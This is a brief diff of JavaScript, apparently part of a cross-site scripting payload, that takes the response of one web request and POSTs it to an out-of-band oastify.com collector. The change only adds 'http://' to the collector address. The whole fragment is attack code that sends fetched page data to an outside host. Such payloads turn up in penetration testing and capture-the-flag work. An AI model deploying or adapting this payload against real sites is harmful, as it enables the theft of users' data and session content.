@@ -9,7 +9,7 @@
         xhttp.onreadystatechange = function() {
             if (this.readyState == 4 && this.status == 200) {
                 let response = this.responseText;
-                let webhook = "qmg8dwmyok1ahh4cw7838vmqghm7aw.oastify.com";
+                let webhook = "http://qmg8dwmyok1ahh4cw7838vmqghm7aw.oastify.com";
                 let xhttp2 = new XMLHttpRequest();
                 xhttp2.open("POST", webhook, true);
                 xhttp2.setRequestHeader("Content-type", "application/json");
